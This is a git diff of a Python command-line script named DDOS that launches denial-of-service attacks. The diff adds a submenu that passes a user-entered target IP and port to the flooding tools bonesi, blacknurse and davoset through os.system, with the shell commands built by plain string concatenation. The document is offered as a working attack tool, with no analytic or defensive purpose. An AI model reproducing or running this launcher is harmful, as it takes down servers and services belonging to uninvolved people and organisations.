@@ -1,5 +1,6 @@
 import os
 import sys
+import time
 
 class DDOS:
     print("""
@@ -23,21 +24,39 @@ Created by: Genesis""")
     while True:
         choice = input("Enter your choice: ")
         if choice == "1":
-            host_ip = input("Enter the host ip: ")
-            host_port = input("Enter the host port: ")
-            net_interface = input("Enter the network interface: ")
-            os.system('bonesi -i /usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
-            input ("Press Enter to continue...")
-            os.system('clear')
+            print("""
+            [1] bonsi DDOS
+            [2] blacknurse DDOS
+            [3] davoset DDOS
+            [4] exit \n""")
+            while True:
+                choice = input("Enter your choice: ")
+                if choice == "1":
+                    print("Invalid input")
+                    host_ip = input("Enter the host ip: ")
+                    host_port = input("Enter the host port: ")
+                    net_interface = input("Enter the network interface: ")
+                    os.system('bonesi -i /usr/share/bonesi/50k-bots.txt -p tcp -r 0 -d '+net_interface+' -b /usr/share/bonesi/browserlist.txt ' + host_ip + ':' + host_port)
+                    time.sleep(5)
+                    os.system('clear')
+                if choice == "2":
+                    target_ip = input("Enter the target ip: ")
+                    os.system('blacknurse ' + target_ip)
+                    time.sleep(5)
+                    os.system('clear')
+                if choice == "3":
+                    os.system('davoset')
+                    time.sleep(5)
+                    os.system('clear')
+                if choice == "4":
+                    break
         if choice == "2":
             host_ip = input("Enter the host ip: ")
             os.system('ping ' + host_ip)
-            input ("Press Enter to continue...")
         if choice == "3":
             sys.exit()
         else:
             print("Invalid choice")
-            input ("Press Enter to continue...")
             os.system('clear')
 
 if __name__ == "__main__":
